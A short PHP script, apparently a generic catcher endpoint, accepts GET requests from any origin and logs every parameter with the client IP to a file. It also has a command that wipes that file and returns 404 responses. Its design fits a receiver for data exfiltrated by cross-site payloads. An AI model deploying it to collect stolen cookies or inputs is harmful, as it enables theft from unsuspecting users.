<?php
header("Access-Control-Allow-Origin: *");

if ($_SERVER["REQUEST_METHOD"] == "GET") {
    if (isset($_GET["cmd"]) && $_GET["cmd"] == "clr") {
        if (file_exists("request")) {
            unlink("request");
            http_response_code(404);
            exit();
        } else {
            http_response_code(404);
            exit("El archivo request no existe.");
        }
    }

    $datos = $_GET;
    $cadenaDatos = json_encode($datos);
    $archivo = "request";
    $fechaHora = date("d/m/y-H:i");
    $host = $_SERVER["REMOTE_ADDR"];
    $encabezado = "[" . $fechaHora . "-REF:" . $host . "/]";
    $texto = $encabezado . "\n" . $cadenaDatos . "\n";
    $manejadorArchivo = fopen($archivo, "a");
    fwrite($manejadorArchivo, $texto);
    fclose($manejadorArchivo);

    // Log solo con la fecha, hora y IP
    $logArchivo = "log.txt";
    $logTexto = $encabezado . "\n";
    file_put_contents($logArchivo, $logTexto, FILE_APPEND);

    http_response_code(200);
} else {
    header("Location: /404", true, 404);
}
?>
